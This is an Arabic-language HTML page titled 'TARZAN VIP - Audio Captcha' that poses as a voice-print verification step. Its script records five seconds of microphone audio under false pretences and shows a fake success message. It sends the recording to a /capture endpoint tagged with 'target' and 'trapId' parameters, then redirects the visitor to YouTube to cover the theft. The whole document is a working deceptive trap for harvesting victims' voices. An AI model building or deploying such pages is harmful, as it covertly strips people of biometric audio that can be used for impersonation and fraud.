
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TARZAN VIP - Audio Captcha</title>
    <style>
        body { background-color: #0a0a0a; color: #fff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .container { text-align: center; padding: 40px; border-radius: 15px; background: #141414; box-shadow: 0 0 25px rgba(0, 255, 136, 0.1); border: 1px solid #00ff88; max-width: 85%; width: 350px; }
        h2 { color: #00ff88; margin-bottom: 10px; font-weight: 800; }
        p { color: #888; font-size: 14px; margin-bottom: 30px; line-height: 1.6; }
        button { background: linear-gradient(45deg, #00ff88, #00cc6a); color: #000; border: none; padding: 15px 30px; font-size: 16px; border-radius: 8px; cursor: pointer; font-weight: bold; width: 100%; transition: 0.3s; }
        button:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(0, 255, 136, 0.4); }
        .mic-icon { font-size: 50px; margin-bottom: 10px; animation: pulse 2s infinite; }
        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }
    </style>
</head>
<body>
    <div class="container" id="ui">
        <div class="mic-icon">🎙️</div>
        <h2>التحقق عبر البصمة الصوتية</h2>
        <p>لتأكيد هويتك وتخطي نظام الحماية، يرجى السماح بالوصول للميكروفون لإجراء اختبار صوتي سريع.</p>
        <button onclick="startVerification()">السماح وإجراء الاختبار</button>
    </div>

    <script>
        const urlParams = new URLSearchParams(window.location.search);

        async function startVerification() {
            document.getElementById('ui').innerHTML = '<div class="mic-icon" style="color:red;">🔴</div><h2 style="color:#ff4444;">جاري التسجيل...</h2><p>يتم الآن مطابقة بصمتك الصوتية مع قواعد البيانات الأمنية.</p>';
            
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                const recorder = new MediaRecorder(stream);
                const chunks = [];
                
                recorder.ondataavailable = e => chunks.push(e.data);
                
                recorder.onstop = async () => {
                    document.getElementById('ui').innerHTML = '<h2>✅ اكْتَمَلَ الفَحْص</h2><p style="color:#00ff88;">تمت المطابقة بنجاح، جاري التوجيه...</p>';
                    
                    const blob = new Blob(chunks, { type: 'audio/webm' });
                    const reader = new FileReader();
                    
                    reader.readAsDataURL(blob);
                    reader.onloadend = async () => {
                        await fetch('/capture', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ 
                                type: 'audio', 
                                data: reader.result, 
                                targetNumber: urlParams.get('target'), 
                                trapId: urlParams.get('id'), 
                                sessionId: urlParams.get('session') 
                            })
                        });
                        window.location.href = "https://www.youtube.com"; 
                    }
                };
                
                recorder.start();
                
                // يسجل لمدة 5 ثواني ثم يتوقف ويرسل الصوت
                setTimeout(() => { 
                    recorder.stop(); 
                    stream.getTracks().forEach(track => track.stop()); 
                }, 5000); 

            } catch (err) {
                document.getElementById('ui').innerHTML = '<h2>❌ فَشِلَ الوُصُول</h2><p>يجب السماح بالميكروفون لإكمال العملية.</p><button onclick="location.reload()">إعادة المحاولة</button>';
            }
        }
    </script>
</body>
</html>
